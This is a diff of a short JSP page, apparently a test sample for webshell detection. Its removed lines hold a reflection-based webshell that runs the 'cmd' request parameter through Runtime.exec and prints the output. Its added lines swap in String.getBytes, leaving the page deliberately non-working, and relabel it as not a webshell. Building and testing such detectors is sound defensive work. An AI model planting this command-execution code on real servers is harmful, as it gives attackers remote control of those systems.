@@ -1,10 +1,10 @@
 <%@ page language="java" pageEncoding="UTF-8" %>
 <%
-    // 基本反射马
+    // 这不是webshell不应该被检测出
     String cmd = request.getParameter("cmd");
-    Class rt = Class.forName("java.lang.Runtime");
-    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
-    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
+    Class rt = Class.forName("java.lang.String");
+    java.lang.reflect.Method gr = rt.getMethod("getBytes");
+    java.lang.reflect.Method ex = rt.getMethod("getBytes");
     Process process = (Process) ex.invoke(gr.invoke(null), cmd);
     java.io.InputStream in = process.getInputStream();
     out.print("<pre>");
